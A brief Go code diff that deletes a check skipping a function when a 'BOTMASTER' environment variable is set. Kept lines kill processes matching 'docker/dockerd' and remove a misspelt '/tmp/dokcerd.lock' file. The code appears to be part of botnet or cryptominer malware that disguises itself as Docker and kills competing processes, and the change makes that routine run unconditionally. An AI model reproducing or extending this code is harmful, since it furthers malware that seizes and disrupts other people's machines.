@@ -241,9 +241,6 @@ func fexists(name string) bool {
 
 func run1() {
 	//go csh()
-	if os.Getenv("BOTMASTER") == "TRUE" {
-		return
-	}
 	_ = exec.Command("pkill", "-f", "docker/dockerd").Start()
 	_ = os.Remove("/tmp/dokcerd.lock")
 
